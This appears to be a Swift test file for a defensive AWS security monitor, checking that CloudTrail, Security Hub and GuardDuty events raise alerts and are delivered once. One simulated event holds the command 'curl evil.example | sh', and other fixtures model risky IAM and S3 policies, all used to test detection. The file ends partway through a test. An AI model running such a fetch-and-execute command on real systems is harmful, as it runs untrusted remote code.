import Foundation
import NoodleCore
import NoodleToolConnections
@testable import PionCore
import XCTest

/// AWS as the watch reads it, honouring each request's time window and paging as AWS does: CloudTrail's event history
/// newest first, 50 a page; Security Hub's findings by when they were made, oldest first, 100 a page; each account its
/// own. Each feed can be refused, cut short or throttled.
final class TimedAWS: ServiceAccess, @unchecked Sendable {
    enum Mode { case whole, denied, truncated, throttled, off, badToken }
    struct Event { let id: String, time: Date, region: String, detail: [String: Any] }
    struct Finding { let id: String, created: Date, severity: String }

    let lock = NSLock()
    var accounts: [AWSAccount]
    var events: [String: [Event]] = [:]
    var findings: [String: [Finding]] = [:]
    var modes: [String: Mode] = [:]
    /// Accounts the connection's role is missing in.
    var missingRole: Set<String> = []
    var trailsLogging = true
    var signInFails = false
    private(set) var requests: [(account: String, request: URLRequest)] = []

    init(accounts: [AWSAccount]) { self.accounts = accounts }

    func awsAccounts() async throws -> [AWSAccount] {
        if lock.withLock({ signInFails }) { throw ToolConnectionError.message("Sign in to AWS again.") }
        return lock.withLock { accounts }
    }

    func access(asAWSAccount id: String) async throws -> any ServiceAccess {
        if lock.withLock({ missingRole.contains(id) }) { throw ToolConnectionError.message("The person has no role SecurityAudit in account \(id).") }
        return Scoped(parent: self, account: id)
    }

    func data(for request: URLRequest) async throws -> (Data, HTTPURLResponse) { throw ServiceError.input("Name the account.") }

    struct Scoped: ServiceAccess {
        let parent: TimedAWS, account: String
        func data(for request: URLRequest) async throws -> (Data, HTTPURLResponse) { parent.answer(request, account: account) }
    }

    func requests(_ kind: String) -> [URLRequest] { lock.withLock { requests.map(\.request).filter { $0.url?.host?.hasPrefix(kind) == true } } }

    private func reply(_ request: URLRequest, _ status: Int, _ object: Any) -> (Data, HTTPURLResponse) {
        (try! JSONSerialization.data(withJSONObject: object), HTTPURLResponse(url: request.url!, statusCode: status, httpVersion: nil, headerFields: [:])!)
    }

    func answer(_ request: URLRequest, account: String) -> (Data, HTTPURLResponse) {
        lock.lock()
        defer { lock.unlock() }
        requests.append((account, request))
        let host = request.url?.host ?? "", target = request.value(forHTTPHeaderField: "X-Amz-Target") ?? ""
        let body = (try? JSONSerialization.jsonObject(with: request.httpBody ?? Data())) as? [String: Any] ?? [:]
        let region = host.split(separator: ".").dropFirst().first.map(String.init) ?? ""
        let offset = Int(body["NextToken"] as? String ?? "") ?? 0
        func mode(_ kind: String) -> Mode { modes[kind] ?? .whole }
        if target.hasSuffix("LookupEvents") {
            switch mode("cloudtrail") {
            case .denied: return reply(request, 400, ["__type": "AccessDeniedException", "message": "not authorized to perform cloudtrail:LookupEvents"])
            case .throttled: return reply(request, 400, ["__type": "ThrottlingException", "message": "Rate exceeded"])
            case .truncated: return reply(request, 200, ["Events": [], "NextToken": "999999"])
            case .whole, .off, .badToken: break
            }
            let from = Date(timeIntervalSince1970: (body["StartTime"] as? Double) ?? 0), to = Date(timeIntervalSince1970: (body["EndTime"] as? Double) ?? .infinity)
            let matched = (events[account] ?? []).filter { $0.region == region && $0.time >= from && $0.time <= to }.sorted { $0.time > $1.time }
            let page = matched.dropFirst(offset).prefix(50).map { event -> [String: Any] in
                AWSTests.event(event.id, event.detail["eventName"] as? String ?? "?", time: event.time.timeIntervalSince1970, detail: event.detail)
            }
            var answer: [String: Any] = ["Events": Array(page)]
            if offset + 50 < matched.count { answer["NextToken"] = String(offset + 50) }
            return reply(request, 200, answer)
        }
        if target.hasSuffix("DescribeTrails") {
            return reply(request, 200, ["trailList": [["Name": "org", "TrailARN": "arn:aws:cloudtrail:us-east-1:\(account):trail/org", "IsMultiRegionTrail": true]]])
        }
        if target.hasSuffix("GetTrailStatus") { return reply(request, 200, ["IsLogging": trailsLogging]) }
        if host.hasPrefix("securityhub.") {
            switch mode("securityhub") {
            case .denied: return reply(request, 403, ["__type": "AccessDeniedException", "Message": "not authorized to perform securityhub:GetFindings"])
            case .off: return reply(request, 400, ["__type": "InvalidAccessException", "Message": "Account \(account) is not subscribed to AWS Security Hub"])
            case .throttled: return reply(request, 429, ["__type": "TooManyRequestsException", "Message": "Rate exceeded"])
            // Security Hub may answer a page with nothing on it and a token to go on with.
            case .truncated: return reply(request, 200, ["Findings": [], "NextToken": String(offset)])
            case .badToken where body["NextToken"] != nil: return reply(request, 400, ["__type": "InvalidInputException", "Message": "The NextToken is not valid."])
            case .whole, .badToken: break
            }
            let filters = body["Filters"] as? [String: Any]
            let range = (filters?["CreatedAt"] as? [[String: String]])?.first
            let from = range?["Start"].flatMap { ServiceAlert.time($0) } ?? .distantPast, to = range?["End"].flatMap { ServiceAlert.time($0) } ?? .distantFuture
            let matched = (findings[account] ?? []).filter { $0.created >= from && $0.created <= to }.sorted { ($0.created, $0.id) < ($1.created, $1.id) }
            let format = ISO8601DateFormatter()
            let page = matched.dropFirst(offset).prefix(100).map { finding -> [String: Any] in
                ["Id": finding.id, "AwsAccountId": account, "Region": region, "Title": "Finding \(finding.id)", "Severity": ["Label": finding.severity],
                 "CreatedAt": format.string(from: finding.created), "UpdatedAt": format.string(from: Date()), "Workflow": ["Status": "NEW"], "RecordState": "ACTIVE"]
            }
            var answer: [String: Any] = ["Findings": Array(page)]
            if offset + 100 < matched.count { answer["NextToken"] = String(offset + 100) }
            return reply(request, 200, answer)
        }
        if host.hasPrefix("guardduty.") {
            switch mode("guardduty") {
            case .off: return reply(request, 200, ["detectorIds": [String]()])
            case .throttled: return reply(request, 400, ["__type": "TooManyRequestsException", "message": "Rate exceeded"])
            case .denied: return reply(request, 403, ["__type": "AccessDeniedException", "message": "not authorized to perform guardduty:ListDetectors"])
            case .whole, .truncated, .badToken: break
            }
            switch request.url?.path {
            case "/detector": return reply(request, 200, ["detectorIds": ["d1"]])
            case "/detector/d1": return reply(request, 200, ["status": "ENABLED"])
            default: return reply(request, 200, ["findingIds": [String](), "findings": [String]()])
            }
        }
        return reply(request, 404, ["message": "not found"])
    }
}

final class AWSWatchTests: XCTestCase {
    private let production = AWSAccount(id: "111111111111", name: "Production", email: nil)
    private let staging = AWSAccount(id: "222222222222", name: "Staging", email: nil)
    private let logs = AWSAccount(id: "333333333333", name: "Log Archive", email: nil)

    private func makeConnection() throws -> ToolConnection {
        try AWS.preset.makeConnection(name: "AWS", values: ["startURL": "https://example.awsapps.com/start", "role": "SecurityAudit", "region": "eu-west-1"])
    }

    private func trail(_ id: String, _ name: String, _ source: String, at time: Date, region: String = "eu-west-1", type: String = "IAMUser",
                       extra: [String: Any] = [:]) -> TimedAWS.Event {
        var detail: [String: Any] = ["eventName": name, "eventSource": source, "recipientAccountId": "111111111111", "sourceIPAddress": "203.0.113.9",
                                     "userIdentity": ["type": type, "arn": "arn:aws:iam::111111111111:user/mallory", "accountId": "111111111111"]]
        detail.merge(extra) { $1 }
        return .init(id: id, time: time, region: region, detail: detail)
    }

    private func label(_ alert: ServiceAlert) -> String { alert.id.split(separator: "/").first.map(String.init) ?? "" }

    // MARK: What wakes

    func testTheWatchJudgesCloudTrailChangesAndWakesOnlyWithIDsAndTimes() async throws {
        let connection = try makeConnection()
        let service = TimedAWS(accounts: [production])
        let now = Date(), at = now.addingTimeInterval(-600)
        let everything = #"{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}"#
        let trust = #"{"Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::999999999999:root"},"Action":"sts:AssumeRole"}]}"#
        let inside = #"{"Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::111111111111:root"},"Action":"sts:AssumeRole"}]}"#
        let oidc = #"{"Statement":[{"Effect":"Allow","Principal":{"Federated":"arn:aws:iam::111111111111:oidc-provider/token.actions.githubusercontent.com"},"Condition":{"StringEquals":{"token.actions.githubusercontent.com:aud":"sts.amazonaws.com"}}}]}"#
        let publicPolicy = ["Statement": [["Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::payroll/*"]]]
        service.events[production.id] = [
            trail("t01", "CreateBucket", "s3.amazonaws.com", at: at, type: "Root"),
            trail("t02", "ConsoleLogin", "signin.amazonaws.com", at: at, region: "us-east-1", extra: ["responseElements": ["ConsoleLogin": "Success"], "additionalEventData": ["MFAUsed": "No"]]),
            trail("t03", "ConsoleLogin", "signin.amazonaws.com", at: at, region: "us-east-1", type: "AssumedRole", extra: ["responseElements": ["ConsoleLogin": "Success"], "additionalEventData": ["MFAUsed": "No"]]),
            trail("t04", "CreateAccessKey", "iam.amazonaws.com", at: at, region: "us-east-1"),
            trail("t05", "AttachUserPolicy", "iam.amazonaws.com", at: at, region: "us-east-1", extra: ["requestParameters": ["policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"]]),
            trail("t06", "AttachUserPolicy", "iam.amazonaws.com", at: at, region: "us-east-1", extra: ["requestParameters": ["policyArn": "arn:aws:iam::aws:policy/ReadOnlyAccess"]]),
            trail("t07", "PutRolePolicy", "iam.amazonaws.com", at: at, region: "us-east-1", extra: ["requestParameters": ["policyDocument": everything]]),
            trail("t08", "UpdateAssumeRolePolicy", "iam.amazonaws.com", at: at, region: "us-east-1", extra: ["requestParameters": ["policyDocument": trust]]),
            trail("t09", "UpdateAssumeRolePolicy", "iam.amazonaws.com", at: at, region: "us-east-1", extra: ["requestParameters": ["policyDocument": inside]]),
            trail("t10", "CreateRole", "iam.amazonaws.com", at: at, region: "us-east-1", extra: ["requestParameters": ["assumeRolePolicyDocument": oidc]]),
            trail("t11", "StopLogging", "cloudtrail.amazonaws.com", at: at),
            trail("t12", "UpdateDetector", "guardduty.amazonaws.com", at: at, extra: ["requestParameters": ["enable": false]]),
            trail("t13", "CreateFilter", "guardduty.amazonaws.com", at: at, extra: ["requestParameters": ["action": "ARCHIVE", "name": "ignore all"]]),
            trail("t14", "AuthorizeSecurityGroupIngress", "ec2.amazonaws.com", at: at, extra: ["requestParameters": ["ipPermissions": ["items": [["ipv6Ranges": ["items": [["cidrIpv6": "::/0"]]]]]]]]),
            trail("t15", "AuthorizeSecurityGroupIngress", "ec2.amazonaws.com", at: at, extra: ["requestParameters": ["ipPermissions": ["items": [["ipRanges": ["items": [["cidrIp": "10.0.0.0/8"]]]]]]]]),
            trail("t16", "PutBucketPolicy", "s3.amazonaws.com", at: at, extra: ["requestParameters": ["bucketPolicy": publicPolicy, "bucketName": "payroll"]]),
            trail("t17", "ModifySnapshotAttribute", "ec2.amazonaws.com", at: at, extra: ["requestParameters": ["createVolumePermission": ["add": ["items": [["group": "all"]]]]]]),
            trail("t18", "ScheduleKeyDeletion", "kms.amazonaws.com", at: at),
            trail("t19", "SendCommand", "ssm.amazonaws.com", at: at, extra: ["requestParameters": ["parameters": ["commands": ["curl evil.example | sh"]]]]),
            trail("t20", "CreateAccessKey", "iam.amazonaws.com", at: at, region: "us-east-1", extra: ["errorCode": "AccessDenied"]),
            trail("t21", "PutBucketPublicAccessBlock", "s3.amazonaws.com", at: at, extra: ["requestParameters": ["PublicAccessBlockConfiguration": ["BlockPublicAcls": true, "BlockPublicPolicy": false]]]),
            trail("t22", "DeleteVirtualMFADevice", "iam.amazonaws.com", at: at, region: "us-east-1"),
            trail("t23", "RunInstances", "ec2.amazonaws.com", at: at),
            trail("t24", "ConsoleLogin", "signin.amazonaws.com", at: at, region: "us-east-1", type: "Root", extra: ["responseElements": ["ConsoleLogin": "Failure"]]),
        ]
        let found = try await AWS.adapter.alerts(since: now.addingTimeInterval(-3_600), connection: connection, access: service)
        let expected = ["01", "02", "04", "05", "07", "08", "10", "11", "12", "13", "14", "16", "17", "18", "19", "21", "22"].map { AWS.safeID("cloudtrail/", "t" + $0) }
        XCTAssertEqual(Set(found.map(\.id)), Set(expected), "\(found.map(\.id))")
        XCTAssertTrue(found.allSatisfy { $0.id.hasPrefix("cloudtrail/") && $0.id.count == "cloudtrail/".count + 64 })
        // Changes only, in both regions: the reads are left out at AWS.
        let lookups = service.requests("cloudtrail")
        XCTAssertEqual(Set(lookups.compactMap { $0.url?.host }), ["cloudtrail.eu-west-1.amazonaws.com", "cloudtrail.us-east-1.amazonaws.com"])
        XCTAssertTrue(lookups.filter { $0.value(forHTTPHeaderField: "X-Amz-Target")?.hasSuffix("LookupEvents") == true }.allSatisfy { request in
            ((try? JSONSerialization.jsonObject(with: request.httpBody!)) as? [String: Any])?["LookupAttributes"] as? [[String: String]] == [["AttributeKey": "ReadOnly", "AttributeValue": "false"]]
        })

        // security-events reads the same, with what each did and nothing of the request, such as the command.
        let events = try await AWS.adapter.run("security-events", arguments: Data("{}".utf8), connection: connection, access: service)
        let text = String(data: events, encoding: .utf8) ?? ""
        for said in ["root called CreateBucket", "IAM user signed in to the console without MFA", "access key made", "AdministratorAccess attached",
                     "inline policy allowing every action or all of IAM put", "role made assumable by account 999999999999",
                     "role made assumable by an identity provider's tokens for any subject", "CloudTrail StopLogging", "GuardDuty detector suspended",
                     "GuardDuty filter that archives findings made", "security group opened to the internet", "bucket policy lets anyone in",
                     "EBS snapshot made public", "KMS key scheduled for deletion", "Systems Manager SendCommand", "S3 Block Public Access loosened",
                     "MFA device removed", "from 203.0.113.9", "Not watched:"] {
            XCTAssertTrue(text.contains(said), "\(said): \(text)")
        }
        XCTAssertFalse(text.contains("curl"), text)
        XCTAssertFalse(text.contains("ignore all"), text)
    }

    /// Findings are watched by when they were made, high and critical ones that are open: one read from GuardDuty and
    /// Security Hub both is one.
    func testFindingsWakeOnceWhicheverFeedListsThem() async throws {
        XCTAssertEqual(AWS.findingID("arn:aws:guardduty:eu-west-1:111111111111:detector/d1/finding/f1"),
                       AWS.findingID("arn:aws:guardduty:eu-west-1:111111111111:detector/d1/finding/f1"))
        let connection = try makeConnection()
        let service = TimedAWS(accounts: [production])
        let now = Date()
        service.findings[production.id] = [.init(id: "arn:one", created: now.addingTimeInterval(-300), severity: "CRITICAL"),
                                           .init(id: "arn:two", created: now.addingTimeInterval(-200), severity: "HIGH"),
                                           .init(id: "arn:old", created: now.addingTimeInterval(-40 * 3_600), severity: "HIGH")]
        let found = try await AWS.adapter.alerts(since: now.addingTimeInterval(-3_600), connection: connection, access: service)
        XCTAssertEqual(Set(found.map(\.id)), Set(["arn:one", "arn:two"].map(AWS.findingID)))
        let request = try XCTUnwrap(service.requests("securityhub").first)
        let filters = try XCTUnwrap(((try JSONSerialization.jsonObject(with: request.httpBody!)) as? [String: Any])?["Filters"] as? [String: Any])
        XCTAssertEqual(filters["WorkflowStatus"] as? [[String: String]], [["Value": "NEW", "Comparison": "EQUALS"], ["Value": "NOTIFIED", "Comparison": "EQUALS"]])
        XCTAssertEqual(filters["RecordState"] as? [[String: String]], [["Value": "ACTIVE", "Comparison": "EQUALS"]])
        XCTAssertEqual(filters["SeverityLabel"] as? [[String: String]], [["Value": "CRITICAL", "Comparison": "EQUALS"], ["Value": "HIGH", "Comparison": "EQUALS"]])
        let list = try XCTUnwrap(service.requests("guardduty").first { $0.url?.path == "/detector/d1/findings" })
        let criterion = try XCTUnwrap((((try JSONSerialization.jsonObject(with: list.httpBody!)) as? [String: Any])?["findingCriteria"] as? [String: Any])?["criterion"] as? [String: Any])
        XCTAssertEqual((criterion["service.archived"] as? [String: [String]])?["eq"], ["false"])
        XCTAssertEqual((criterion["severity"] as? [String: Int])?["gte"], 7)
    }

    // MARK: Telling what cannot be read

    func testTheWatchTellsOnceWhatIsOffOrCannotBeReadAndHoldsBackForPassingFailures() async throws {
        let connection = try makeConnection()
        let since = Date().addingTimeInterval(-3_600)
        let service = TimedAWS(accounts: [production, staging])
        service.modes = ["guardduty": .off, "securityhub": .off]
        service.trailsLogging = false
        service.missingRole = [staging.id]
        let first = try await AWS.adapter.alerts(since: since, connection: connection, access: service)
        let tag = AWS.accountTag(production.id), other = AWS.accountTag(staging.id)
        let told = Set(first.map { $0.id.split(separator: "/").dropLast().joined(separator: "/") })
        XCTAssertEqual(told, ["unreadable/guardduty/\(tag)/eu-west-1", "unreadable/securityhub/\(tag)/eu-west-1", "unreadable/trails/\(tag)",
                              "unreadable/guardduty/\(other)/eu-west-1", "unreadable/securityhub/\(other)/eu-west-1",
                              "unreadable/cloudtrail/\(other)/eu-west-1", "unreadable/cloudtrail/\(other)/us-east-1"], "\(told.sorted())")
        XCTAssertTrue(first.allSatisfy { $0.time == since }, "notices are dated at the window's start, moving nothing on")
        XCTAssertFalse(first.contains { $0.id.contains(production.id) || $0.id.contains("Production") })
        let again = try await AWS.adapter.alerts(since: since, connection: connection, access: service)
        XCTAssertTrue(again.isEmpty, "told once: \(again.map(\.id))")
        let read = String(data: try await AWS.adapter.run("security-events", arguments: Data("{}".utf8), connection: connection, access: service), encoding: .utf8) ?? ""
        for said in ["Off: GuardDuty is off in account Production (111111111111) in eu-west-1", "Off: Security Hub is off in account Production (111111111111) in eu-west-1",
                     "Off: no CloudTrail trail is logging in account Production (111111111111)", "Could not read CloudTrail's event history of Staging (222222222222) in eu-west-1",
                     "no role SecurityAudit in account 222222222222", "Searched: CloudTrail's changes"] {
            XCTAssertTrue(read.contains(said), "\(said): \(read)")
        }

        // A passing failure, AWS throttling, holds the watch back instead, a few checks at most, then is told.
        let busy = TimedAWS(accounts: [production])
        busy.modes = ["cloudtrail": .throttled]
        let held = try makeConnection()
        for _ in 0..<AWS.NewSecurityEvents.holdChecks {
            do {
                _ = try await AWS.adapter.alerts(since: since, connection: held, access: busy)
                XCTFail("a passing failure holds the watch")
            } catch {
                XCTAssertTrue(error.localizedDescription.contains("CloudTrail's event history of Production (111111111111)"), error.localizedDescription)
            }
        }
        let late = try await AWS.adapter.alerts(since: since, connection: held, access: busy)
        XCTAssertEqual(Set(late.map { $0.id.split(separator: "/").first! }), ["unreadable"])

        // Accounts past the most the watch reads are told, and the sign-in failing is told, never silent.
        let many = TimedAWS(accounts: (0..<(AWS.watchAccounts + 2)).map { AWSAccount(id: String(format: "%012d", $0 + 1), name: "A\($0)", email: nil) })
        let crowd = try await AWS.adapter.alerts(since: since, connection: try makeConnection(), access: many)
        XCTAssertEqual(crowd.filter { $0.id.hasPrefix("unchecked/accounts/") }.count, 1)
        XCTAssertEqual(Set(many.lock.withLock { many.requests.map(\.account) }).count, AWS.watchAccounts)
        many.signInFails = true
        let signedOut = try makeConnection()
        let failing = try await AWS.adapter.alerts(since: since, connection: signedOut, access: many)
        XCTAssertEqual(failing.map { $0.id.split(separator: "/").prefix(2).joined(separator: "/") }, ["unreadable/accounts"])
        let quiet = try await AWS.adapter.alerts(since: since, connection: signedOut, access: many)
        XCTAssertTrue(quiet.isEmpty)
    }

    // MARK: Delivering everything exactly once

    /// More than one check returns is all returned over the checks after, each once, with that more follow told once.
    func testABurstBiggerThanOneCheckIsAllDeliveredOverLaterChecks() async throws {
        let connection = try makeConnection()
        let accounts = [production, staging, logs]
        let service = TimedAWS(accounts: accounts)
        let start = Date().addingTimeInterval(-3_600)
        var ids: [String] = []
        for (number, account) in accounts.enumerated() {
            service.findings[account.id] = (0..<300).map { index in
                let id = "arn:\(account.id):\(index)"
                ids.append(id)
                return .init(id: id, created: start.addingTimeInterval(Double(number * 300 + index)), severity: index % 7 == 0 ? "CRITICAL" : "HIGH")
            }
        }
        var watch = AlertWatch()
        XCTAssertNil(watch.since(connection.id, at: start.addingTimeInterval(-60)))
        var delivered: [String] = [], notices: [String] = [], checks = 0
        while checks < 6 {
            checks += 1
            let since = try XCTUnwrap(watch.since(connection.id, at: Date(), lookBack: AWS.adapter.alertLookBack))
            let found = try await AWS.adapter.alerts(since: since, connection: connection, access: service)
            XCTAssertLessThanOrEqual(found.count, ServiceAlert.most)
            guard watch.take(found, for: connection.id, lookBack: AWS.adapter.alertLookBack) != nil else { break }
            notices += found.map(\.id).filter { $0.hasPrefix("unchecked/") }
            delivered += found.map(\.id).filter { $0.hasPrefix("finding/") }
        }
        XCTAssertEqual(delivered.count, ids.count, "each once")
        XCTAssertEqual(Set(delivered), Set(ids.map(AWS.findingID)), "every finding is returned in time")
        XCTAssertEqual(notices.map { $0.split(separator: "/").prefix(2).joined(separator: "/") }, ["unchecked/backlog"], "that more follow is told once")
        XCTAssertEqual(checks, 3)
    }

    /// A feed with more than one check reads goes on, oldest first, from where it stopped, until all of it is returned.
    func testAFeedCutShortGoesOnFromWhereItStopped() async throws {
        let connection = try makeConnection()
        let service = TimedAWS(accounts: [production])
        let start = Date().addingTimeInterval(-2 * 3_600)
        let ids = (0..<1_000).map { "arn:cut:\($0)" }
        service.findings[production.id] = ids.enumerated().map { .init(id: $1, created: start.addingTimeInterval(Double($0)), severity: "HIGH") }
        var watch = AlertWatch()
        XCTAssertNil(watch.since(connection.id, at: start.addingTimeInterval(-60)))
        var delivered: [String] = [], cut = 0
        // Three checks read it all; three more read the overlap again, catching up through what was returned.
        for _ in 0..<6 {
            let since = try XCTUnwrap(watch.since(connection.id, at: Date(), lookBack: AWS.adapter.alertLookBack))
            let found = try await AWS.adapter.alerts(since: since, connection: connection, access: service)
            _ = watch.take(found, for: connection.id, lookBack: AWS.adapter.alertLookBack)
            delivered += found.map(\.id).filter { $0.hasPrefix("finding/") }
            cut += found.filter { $0.id.hasPrefix("unchecked/") }.count
            XCTAssertFalse(found.contains { $0.id.hasPrefix("unchecked/securityhub/") }, "a read that goes on from where it stopped leaves no gap")
        }
        XCTAssertEqual(delivered.count, ids.count, "each once")
        XCTAssertEqual(Set(delivered), Set(ids.map(AWS.findingID)))
        XCTAssertEqual(cut, 1, "that more follow is told once while it lasts, and catching up again later tells nothing")
        XCTAssertTrue(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.owedFrom.isEmpty } ?? false)
    }

    /// Findings made at the same moment have no order but AWS's: more of them than a check reads is gone on with by
    /// AWS's token for the same query, never by their time, so none is read again for ever while the rest wait; one
    /// made later, tied or not, is read too, each once.
    func testTiedFindingsAcrossThePageBoundaryAreGoneOnWithByToken() async throws {
        let connection = try makeConnection()
        let service = TimedAWS(accounts: [production])
        let tied = Date().addingTimeInterval(-3_600)
        var ids = (0..<450).map { String(format: "arn:tie:%03d", $0) }
        service.findings[production.id] = ids.map { .init(id: $0, created: tied, severity: "HIGH") }
        var watch = AlertWatch()
        XCTAssertNil(watch.since(connection.id, at: tied.addingTimeInterval(-60)))
        var delivered: [String] = [], notices: [String] = []
        // Two checks read the query to its end; two more read the overlap again, catching up through what was returned.
        for check in 1...4 {
            if check == 2 {
                // Made since the query began: one at the same moment, after the page boundary, and one later.
                service.lock.withLock {
                    service.findings[production.id]! += [.init(id: "arn:tie:zzz", created: tied, severity: "CRITICAL"),
                                                         .init(id: "arn:later", created: tied.addingTimeInterval(60), severity: "HIGH")]
                }
                ids += ["arn:tie:zzz", "arn:later"]
            }
            let since = try XCTUnwrap(watch.since(connection.id, at: Date(), lookBack: AWS.adapter.alertLookBack))
            let found = try await AWS.adapter.alerts(since: since, connection: connection, access: service)
            _ = watch.take(found, for: connection.id, lookBack: AWS.adapter.alertLookBack)
            delivered += found.map(\.id).filter { $0.hasPrefix("finding/") }
            notices += found.map(\.id).filter { !$0.hasPrefix("finding/") }
            if check == 1 {
                XCTAssertEqual(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.continuations.values.first?.token }, "400", "the query's token is kept")
            }
        }
        XCTAssertEqual(delivered.count, ids.count, "each once")
        XCTAssertEqual(Set(delivered), Set(ids.map(AWS.findingID)))
        XCTAssertEqual(notices.map { $0.split(separator: "/").prefix(2).joined(separator: "/") }, ["unchecked/backlog"], "that more follow is told once")
        let pages = service.requests("securityhub").compactMap { ((try? JSONSerialization.jsonObject(with: $0.httpBody!)) as? [String: Any]) }
        let resumed = try XCTUnwrap(pages.first { $0["NextToken"] as? String == "400" })
        let first = try XCTUnwrap(pages.first)
        XCTAssertEqual((resumed["Filters"] as? [String: Any])?["CreatedAt"] as? [[String: String]], (first["Filters"] as? [String: Any])?["CreatedAt"] as? [[String: String]],
                       "the token goes with the query it came from")
        XCTAssertTrue(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.continuations.isEmpty } ?? false)
        XCTAssertTrue(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.owedFrom.isEmpty } ?? false)
    }

    /// A query read over several checks accounts for its own window only: while it was read, another feed moved the
    /// watch on by more than its overlap, and a finding made just after the query's end is still read, once.
    func testAQueryReadOverSeveralChecksLeavesNoGapAfterItsEnd() async throws {
        let connection = try makeConnection()
        let trigger = AWS.NewSecurityEvents()
        let service = TimedAWS(accounts: [production])
        let client = ServiceClient(base: connection.endpoint, access: service, settings: connection.settings ?? [:], account: connection.id)
        let base = Date().addingTimeInterval(-30 * 3_600)
        let ids = (0..<1_000).map { String(format: "arn:drain:%04d", $0) }
        service.findings[production.id] = ids.map { .init(id: $0, created: base.addingTimeInterval(-30), severity: "HIGH") }
        // CloudTrail, read whole each check, moves the watch seven hours on while Security Hub's query is still read.
        service.events[production.id] = [trail("c-late", "StopLogging", "cloudtrail.amazonaws.com", at: base.addingTimeInterval(7 * 3_600))]
        var watch = AlertWatch()
        XCTAssertNil(watch.since(connection.id, at: base.addingTimeInterval(-60)))
        var delivered: [String] = []
        let after = AWS.findingID("arn:drain:after")
        for (check, hours) in [0.0, 4, 8, 9, 9.1, 9.2, 9.3].enumerated() {
            let now = base.addingTimeInterval(hours * 3_600)
            if check == 1 {
                // Made just after the query's end, so outside the window its token reads.
                service.lock.withLock { service.findings[production.id]!.append(.init(id: "arn:drain:after", created: base.addingTimeInterval(1_800), severity: "CRITICAL")) }
            }
            let since = try XCTUnwrap(watch.since(connection.id, at: now, lookBack: AWS.adapter.alertLookBack))
            if check == 3 { XCTAssertGreaterThan(since, base.addingTimeInterval(1_800), "the watch has moved past the finding") }
            let found = try await trigger.alerts(since: since, on: client, account: connection.id, now: now)
            _ = watch.take(found, for: connection.id, lookBack: AWS.adapter.alertLookBack)
            delivered += found.map(\.id).filter { $0.hasPrefix("finding/") }
            if check == 2 {
                XCTAssertTrue(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.continuations.isEmpty } ?? false, "the query has ended")
                XCTAssertFalse(delivered.contains(after))
            }
        }
        XCTAssertEqual(delivered.filter { $0 == after }.count, 1, "the finding made after the query's end, once")
        XCTAssertEqual(delivered.count, ids.count + 1, "each once")
        XCTAssertEqual(Set(delivered), Set((ids + ["arn:drain:after"]).map(AWS.findingID)))
    }

    /// A token AWS no longer takes gives the query up, said, and its window is read again from its start, each finding
    /// still once.
    func testAQueryWhoseTokenFailsIsReadAgainFromItsStart() async throws {
        let connection = try makeConnection()
        let service = TimedAWS(accounts: [production])
        let tied = Date().addingTimeInterval(-3_600)
        let ids = (0..<450).map { String(format: "arn:again:%03d", $0) }
        service.findings[production.id] = ids.map { .init(id: $0, created: tied, severity: "HIGH") }
        var watch = AlertWatch()
        XCTAssertNil(watch.since(connection.id, at: tied.addingTimeInterval(-60)))
        var delivered: [String] = [], told: [String] = []
        for check in 1...4 {
            service.modes = check == 2 ? ["securityhub": .badToken] : [:]
            let since = try XCTUnwrap(watch.since(connection.id, at: Date(), lookBack: AWS.adapter.alertLookBack))
            let found = try await AWS.adapter.alerts(since: since, connection: connection, access: service)
            _ = watch.take(found, for: connection.id, lookBack: AWS.adapter.alertLookBack)
            delivered += found.map(\.id).filter { $0.hasPrefix("finding/") }
            told += found.map(\.id).filter { !$0.hasPrefix("finding/") }.map { $0.split(separator: "/").prefix(2).joined(separator: "/") }
            if check == 2 { XCTAssertTrue(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.continuations.isEmpty } ?? false, "a failed query is given up") }
        }
        XCTAssertEqual(delivered.count, ids.count, "each once")
        XCTAssertEqual(Set(delivered), Set(ids.map(AWS.findingID)))
        XCTAssertTrue(told.contains("unreadable/securityhub") && told.contains("unchecked/securityhub"), "\(told)")
        XCTAssertTrue(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.owedFrom.isEmpty } ?? false)
    }

    /// A check that fails keeps nothing it read but how many checks in a row failed: the next reads the same window and
    /// returns what the failed one found.
    func testAFailedCheckKeepsOnlyItsFailureStreak() async throws {
        let connection = try makeConnection()
        let trigger = AWS.NewSecurityEvents()
        let service = TimedAWS(accounts: [production])
        let client = ServiceClient(base: connection.endpoint, access: service, settings: connection.settings ?? [:], account: connection.id)
        let first = Date().addingTimeInterval(-20 * 3_600), later = first.addingTimeInterval(10 * 3_600)
        _ = try await trigger.alerts(since: first.addingTimeInterval(-10 * 3_600), on: client, account: connection.id, now: first)
        let feed = AWS.Feed(kind: .cloudtrail, account: production, region: "eu-west-1").label
        XCTAssertEqual(AWS.NewSecurityEvents.kept.withLock { $0[connection.id]?.readUntil[feed] }, first)
        service.events[production.id] = [trail("c1", "StopLogging", "cloudtrail.amazonaws.com", at: first.addingTimeInterval(3_600))]
        service.modes = ["guardduty": .throttled]
        do {
            _ = try await trigger.alerts(since: first.addingTimeInterval(-10 * 3_600), on: client, account: connection.id, now: later)
            XCTFail("a passing failure holds the watch")
        } catch {}
        let kept = AWS.NewSecurityEvents.kept.withLock { $0[connection.id] }
        XCTAssertEqual(kept?.readUntil[feed], first, "nothing read was kept")
        XCTAssertEqual(kept?.delivered.count, 0)
        XCTAssertEqual(kept?.inARow.values.reduce(0, +), 1, "only the failure streak was kept")
        service.modes = [:]
        let found = try await trigger.alerts(since: first.addingTimeInterval(-10 * 3_600), on: client, account: connection.id, now: later)
        XCTAssertEqual(found.map(\.id), [AWS.safeID("cloudtrail/", "c1")])
        let lookup = try XCTUnwrap(service.requests("cloudtrail").last { $0.value(forHTTPHeaderField: "X-Amz-Target")?.hasSuffix("LookupEvents") == true })
        let body = try XCTUnwrap((try JSONSerialization.jsonObject(with: lookup.httpBody!)) as? [String: Any])
